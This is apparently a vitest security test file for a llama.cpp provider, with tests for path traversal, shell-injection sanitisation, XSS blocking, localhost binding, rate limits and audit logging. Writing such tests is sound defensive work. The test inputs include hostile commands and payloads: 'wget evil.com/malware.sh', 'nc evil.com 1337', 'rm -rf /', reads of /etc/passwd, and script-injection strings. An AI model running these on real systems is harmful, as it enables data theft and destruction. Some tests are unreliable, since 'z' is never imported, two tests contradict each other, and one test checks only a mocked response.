/**
 * Security Tests for llama.cpp Integration
 * Verifies that all security patches are working correctly
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { 
  SecurityValidator, 
  ResourceLimiter, 
  SecurityAuditLogger,
  SECURITY_LIMITS 
} from '../../../config/llama-cpp-security.config.js';
import { LlamaCppHttpProvider } from '../LlamaCppHttpProvider.js';

describe('Llama.cpp Security Tests', () => {
  
  describe('Path Traversal Protection', () => {
    it('should block path traversal attempts', () => {
      const basePath = '/home/models';
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'model/../../../etc/shadow',
        'model/../../sensitive.gguf'
      ];
      
      for (const filename of maliciousFilenames) {
        expect(() => {
          SecurityValidator.validatePath(basePath, filename);
        }).toThrow(/path traversal/i);
      }
    });
    
    it('should allow valid model filenames', () => {
      const basePath = '/home/models';
      const validFilenames = [
        'llama-3.2-3b-instruct.Q4_K_M.gguf',
        'phi-4-14b-tools.Q3_K_S.gguf',
        'qwen3-0.6b-instruct.Q8_0.gguf'
      ];
      
      for (const filename of validFilenames) {
        expect(() => {
          // This will check the path structure even if file doesn't exist
          const path = SecurityValidator.validatePath(basePath, filename);
          expect(path).toContain(basePath);
          expect(path).not.toContain('..');
        }).not.toThrow();
      }
    });
  });
  
  describe('Input Sanitization', () => {
    it('should remove shell metacharacters', () => {
      const maliciousInputs = [
        'normal text; rm -rf /',
        'text && wget evil.com/malware.sh',
        'prompt | cat /etc/passwd',
        'input`whoami`',
        'text$(uname -a)',
        '<script>alert("XSS")</script>'
      ];
      
      for (const input of maliciousInputs) {
        const sanitized = SecurityValidator.sanitizeText(input);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&&');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('<script');
      }
    });
    
    it('should limit prompt length', () => {
      const longInput = 'a'.repeat(20000);
      const sanitized = SecurityValidator.sanitizeText(longInput);
      expect(sanitized.length).toBeLessThanOrEqual(SECURITY_LIMITS.MAX_PROMPT_LENGTH);
    });
    
    it('should remove control characters', () => {
      const inputWithControlChars = 'normal\x00text\x1Fwith\x7Fcontrol';
      const sanitized = SecurityValidator.sanitizeText(inputWithControlChars);
      expect(sanitized).toBe('normaltextwithcontrol');
    });
    
    it('should block inputs with dangerous patterns', () => {
      const xssAttempts = [
        '<script>alert(1)</script>',
        'javascript:void(0)',
        'data:text/html,<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>'
      ];
      
      for (const xss of xssAttempts) {
        expect(() => {
          SecurityValidator.sanitizeText(xss);
        }).toThrow(/blocked patterns/i);
      }
    });
  });
  
  describe('Network Security', () => {
    it('should only allow localhost connections', () => {
      const invalidHosts = [
        '0.0.0.0',
        '192.168.1.1',
        'example.com',
        '8.8.8.8'
      ];
      
      for (const host of invalidHosts) {
        expect(() => {
          SecurityValidator.validateNetworkBinding(host, 8081);
        }).toThrow(/not allowed/i);
      }
    });
    
    it('should allow localhost variants', () => {
      const validHosts = ['127.0.0.1', 'localhost'];
      
      for (const host of validHosts) {
        expect(() => {
          SecurityValidator.validateNetworkBinding(host, 8081);
        }).not.toThrow();
      }
    });
    
    it('should only allow port 8081', () => {
      const invalidPorts = [80, 443, 8080, 3000, 11434];
      
      for (const port of invalidPorts) {
        expect(() => {
          SecurityValidator.validateNetworkBinding('localhost', port);
        }).toThrow(/not allowed/i);
      }
    });
    
    it('should reject external URLs in HTTP provider', () => {
      const externalUrls = [
        'http://example.com:8081',
        'https://8.8.8.8:8081',
        'http://192.168.1.100:8081'
      ];
      
      for (const url of externalUrls) {
        expect(() => {
          new LlamaCppHttpProvider(url);
        }).toThrow(/localhost connections/i);
      }
    });
  });
  
  describe('Rate Limiting', () => {
    beforeEach(() => {
      // Clear rate limit cache
      SecurityValidator.cleanupRateLimits();
    });
    
    it('should enforce rate limits', () => {
      const clientId = 'test-client';
      const limit = SECURITY_LIMITS.RATE_LIMIT_PER_MINUTE;
      
      // Should allow up to the limit
      for (let i = 0; i < limit; i++) {
        expect(SecurityValidator.checkRateLimit(clientId)).toBe(true);
      }
      
      // Should block after limit is reached
      expect(SecurityValidator.checkRateLimit(clientId)).toBe(false);
    });
    
    it('should reset rate limits after time window', () => {
      vi.useFakeTimers();
      const clientId = 'test-client-2';
      
      // Use up rate limit
      for (let i = 0; i < SECURITY_LIMITS.RATE_LIMIT_PER_MINUTE; i++) {
        SecurityValidator.checkRateLimit(clientId);
      }
      
      expect(SecurityValidator.checkRateLimit(clientId)).toBe(false);
      
      // Advance time by 1 minute
      vi.advanceTimersByTime(60001);
      
      // Should allow requests again
      expect(SecurityValidator.checkRateLimit(clientId)).toBe(true);
      
      vi.useRealTimers();
    });
  });
  
  describe('Resource Limiting', () => {
    beforeEach(() => {
      // Reset resource counters
      while (ResourceLimiter.getUsage().requests > 0) {
        ResourceLimiter.releaseResources(0);
      }
      while (ResourceLimiter.getUsage().memoryGB > 0) {
        ResourceLimiter.releaseResources(1);
      }
    });
    
    it('should limit concurrent requests', async () => {
      // Acquire max concurrent requests
      for (let i = 0; i < SECURITY_LIMITS.MAX_CONCURRENT_REQUESTS; i++) {
        expect(await ResourceLimiter.checkResources(0)).toBe(true);
        ResourceLimiter.acquireResources(0);
      }
      
      // Next request should be blocked
      expect(await ResourceLimiter.checkResources(0)).toBe(false);
      
      // Release one request
      ResourceLimiter.releaseResources(0);
      
      // Should allow one more request
      expect(await ResourceLimiter.checkResources(0)).toBe(true);
    });
    
    it('should limit memory usage', async () => {
      const maxMemory = SECURITY_LIMITS.MAX_MEMORY_GB;
      
      // Try to allocate more than max memory
      expect(await ResourceLimiter.checkResources(maxMemory + 1)).toBe(false);
      
      // Allocate within limits
      expect(await ResourceLimiter.checkResources(maxMemory / 2)).toBe(true);
      ResourceLimiter.acquireResources(maxMemory / 2);
      
      // Can still allocate remaining memory
      expect(await ResourceLimiter.checkResources(maxMemory / 2)).toBe(true);
      ResourceLimiter.acquireResources(maxMemory / 2);
      
      // Now at limit, cannot allocate more
      expect(await ResourceLimiter.checkResources(1)).toBe(false);
    });
  });
  
  describe('Audit Logging', () => {
    beforeEach(() => {
      SecurityAuditLogger.clear();
    });
    
    it('should log security events', () => {
      SecurityAuditLogger.log('warn', 'Suspicious activity', { ip: '127.0.0.1' });
      SecurityAuditLogger.log('error', 'Attack blocked', { type: 'XSS' });
      
      const events = SecurityAuditLogger.getRecentEvents(10);
      expect(events).toHaveLength(2);
      expect(events[0].event).toBe('Suspicious activity');
      expect(events[1].event).toBe('Attack blocked');
    });
    
    it('should limit log size', () => {
      // Add more than 1000 entries
      for (let i = 0; i < 1100; i++) {
        SecurityAuditLogger.log('info', `Event ${i}`);
      }
      
      const events = SecurityAuditLogger.getRecentEvents(2000);
      expect(events.length).toBeLessThanOrEqual(1000);
    });
  });
  
  describe('Command Injection Prevention', () => {
    it('should prevent command injection in prompts', () => {
      const maliciousPrompts = [
        'Analyze this: $(rm -rf /)',
        'Process: `cat /etc/passwd`',
        'Review: && curl evil.com/malware',
        'Check: ; shutdown -h now',
        'Evaluate: | nc evil.com 1337'
      ];
      
      for (const prompt of maliciousPrompts) {
        const sanitized = SecurityValidator.sanitizeText(prompt);
        expect(sanitized).not.toMatch(/[$`;&|]/);
      }
    });
  });
  
  describe('Environment Variable Validation', () => {
    it('should validate numeric environment variables', () => {
      const validations = [
        { value: '100', expected: 100 },
        { value: 'abc', expected: undefined },
        { value: '-1', expected: undefined },
        { value: '999999', expected: undefined }
      ];
      
      const schema = z.number().min(1).max(1000);
      
      for (const test of validations) {
        const result = SecurityValidator.validateEnvVar(
          test.value, 
          'TEST_VAR', 
          z.coerce.number().pipe(schema)
        );
        expect(result).toBe(test.expected);
      }
    });
  });
});

describe('Integration Security Tests', () => {
  let provider: LlamaCppHttpProvider;
  
  beforeEach(() => {
    provider = new LlamaCppHttpProvider('http://localhost:8081');
  });
  
  afterEach(async () => {
    await provider.cleanup();
  });
  
  it('should reject malicious prompts', async () => {
    const maliciousPrompt = 'Process this: $(cat /etc/passwd) && curl evil.com';
    
    // Mock the HTTP client to prevent actual requests
    vi.spyOn(provider as any, 'client').mockImplementation({
      post: vi.fn().mockResolvedValue({
        data: {
          choices: [{ message: { content: 'safe response' } }],
          usage: { completion_tokens: 10, total_tokens: 20 }
        }
      }),
      get: vi.fn().mockResolvedValue({ data: { status: 'ok' } })
    } as any);
    
    // The provider should sanitize the prompt
    const response = await provider.generate(maliciousPrompt);
    
    // Verify the response doesn't contain malicious content
    expect(response.response).not.toContain('/etc/passwd');
    expect(response.response).not.toContain('evil.com');
  });
});

// Performance tests for security features
describe('Security Performance', () => {
  it('should sanitize text quickly', () => {
    const largeText = 'a'.repeat(10000);
    const iterations = 1000;
    
    const start = performance.now();
    for (let i = 0; i < iterations; i++) {
      SecurityValidator.sanitizeText(largeText);
    }
    const duration = performance.now() - start;
    
    // Should complete 1000 sanitizations in under 1 second
    expect(duration).toBeLessThan(1000);
  });
  
  it('should validate paths quickly', () => {
    const iterations = 10000;
    const basePath = '/home/models';
    const filename = 'model.gguf';
    
    const start = performance.now();
    for (let i = 0; i < iterations; i++) {
      try {
        SecurityValidator.validatePath(basePath, filename);
      } catch {
        // Path may not exist, but validation should still be fast
      }
    }
    const duration = performance.now() - start;
    
    // Should complete 10000 validations in under 1 second
    expect(duration).toBeLessThan(1000);
  });
});